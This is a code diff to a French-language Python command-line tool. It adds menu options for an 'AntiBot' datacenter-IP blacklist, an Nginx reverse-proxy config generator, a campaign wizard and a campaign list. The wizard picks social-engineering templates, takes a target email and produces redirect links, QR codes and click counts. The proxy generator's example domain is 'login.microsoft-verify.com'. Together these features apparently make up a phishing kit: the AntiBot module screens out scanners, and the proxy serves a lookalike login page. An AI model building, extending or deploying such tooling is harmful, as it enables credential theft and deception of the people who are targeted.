@@ -30,6 +30,9 @@ import requests
 import time
 import socket
 import platform
+from core.infrastructure.nginx_generator import NginxConfigGenerator
+from core.redirect.antibot import antibot
+from core.social.manager import social_manager
 
 console = Console()
 
@@ -236,11 +239,19 @@ def menu():
         console.print("[bold red]🔧 SYSTÈME[/bold red]")
         console.print("11) Vérifier compatibilité OS")
         console.print("12) Test réseau et connectivité")
+        
+        # Section Avancé (New)
+        console.print("[bold cyan]🔥 PHASE 4 (Avancé)[/bold cyan]")
+        console.print("13) Gestion AntiBot (Blacklist/Logs)")
+        console.print("14) Générer configuration Nginx (Tier 2)")
+        console.print("15) Créer une campagne (Wizard + Slugs)")
+        console.print("16) Lister les campagnes actives")
+        
         console.print("0) Quitter")
         
         console.print("\n[dim]💡 Utilisez 'fuse-qr-link' pour la fusion intelligente recommandée[/dim]")
         
-        choice = input("\n🎯 Sélection (0-12): ").strip()
+        choice = input("\n🎯 Sélection (0-16): ").strip()
         
         if choice == "0":
             console.print("[green]👋 Au revoir![/green]")
@@ -490,8 +501,93 @@ def menu():
             
             console.print(table)
         
+        elif choice == "13":
+            console.print("[bold red]🛡️ GESTION ANTIBOT[/bold red]")
+            console.print(f"Règles Datacenter chargées: {len(antibot.datacenter_networks)}")
+            # Simple interaction
+            sub = input("1) Recharger listes | 2) Tester une IP : ").strip()
+            if sub == "1":
+                antibot.load_blacklist("core/config/datacenter_cidrs.txt")
+                antibot.load_blacklist("core/config/blacklist_ips.txt")
+                console.print("[green]✅ Listes rechargées[/green]")
+            elif sub == "2":
+                ip = input("IP à tester: ").strip()
+                is_dc = antibot.is_datacenter_ip(ip)
+                console.print(f"IP {ip} est Datacenter: {is_dc}")
+
+        elif choice == "14":
+            console.print("[bold blue]🔧 GÉNÉRATEUR NGINX[/bold blue]")
+            domain = input("Domaine (ex: login.microsoft-verify.com): ").strip()
+            upstream = input("Upstream URL (ex: http://127.0.0.1:8001): ").strip() or "http://127.0.0.1:8001"
+            ssl_cert = input("Chemin SSL Cert (Entrée pour sans SSL): ").strip()
+            ssl_key = input("Chemin SSL Key (Entrée pour sans SSL): ").strip()
+            
+            generator = NginxConfigGenerator(
+                domain_name=domain,
+                upstream_url=upstream,
+                ssl_cert=ssl_cert if ssl_cert else None,
+                ssl_key=ssl_key if ssl_key else None
+            )
+            config_content = generator.generate_config()
+            filename = f"nginx_{domain.replace('.', '_')}.conf"
+            with open(filename, "w") as f:
+                f.write(config_content)
+            console.print(f"[green]✅ Configuration générée: {filename}[/green]")
+
+        elif choice == "15":
+            console.print("[bold magenta]🎭 WIZARD CAMPAGNE[/bold magenta]")
+            name = input("Nom de la campagne: ").strip()
+            
+            templates = social_manager.list_templates()
+            console.print("Templates disponibles:")
+            for t in templates:
+                console.print(f" - {t['id']}: {t['name']}")
+            
+            tid = input("ID Template: ").strip()
+            email = input("Email cible (optionnel): ").strip()
+            
+            console.print("\n[bold cyan]🔗 PERSONNALISATION DU LIEN[/bold cyan]")
+            slug = input("Slug personnalisé (laisser vide pour UUID): ").strip()
+            
+            try:
+                camp = social_manager.create_campaign(
+                    name=name,
+                    template_id=tid,
+                    target_email=email if email else None,
+                    custom_slug=slug if slug else None
+                )
+                console.print("[green]✅ Campagne créée avec succès![/green]")
+                console.print(f"🔗 URL: {camp['redirect_url']}")
+                console.print(f"📷 QR: {camp['qr_code_path']}")
+            except Exception as e:
+                console.print(f"[red]❌ Erreur: {e}[/red]")
+
+        elif choice == "16":
+            console.print("[bold cyan]📋 CAMPAGNES ACTIVES[/bold cyan]")
+            campaigns = social_manager.list_campaigns()
+            if not campaigns:
+                console.print("[yellow]⚠️  Aucune campagne active trouvée[/yellow]")
+            else:
+                table = Table(title="Campagnes Actives")
+                table.add_column("ID", style="cyan")
+                table.add_column("Nom", style="bold")
+                table.add_column("Template", style="green")
+                table.add_column("Clicks", style="magenta")
+                table.add_column("URL", style="blue")
+                
+                for c in campaigns:
+                    metrics = c.get("metrics", {})
+                    table.add_row(
+                        c.get("id", "?"),
+                        c.get("name", "Sans nom"),
+                        c.get("template_id", "?"),
+                        str(metrics.get("clicks", 0)),
+                        c.get("redirect_url", "?")
+                    )
+                console.print(table)
+
         else:
-            console.print("[yellow]⚠️  Choix invalide - Sélectionnez 0-12[/yellow]")
+            console.print("[yellow]⚠️  Choix invalide - Sélectionnez 0-16[/yellow]")
             
         # Pause avant de revenir au menu
         input("\n↵ Presser Entrée pour continuer...")
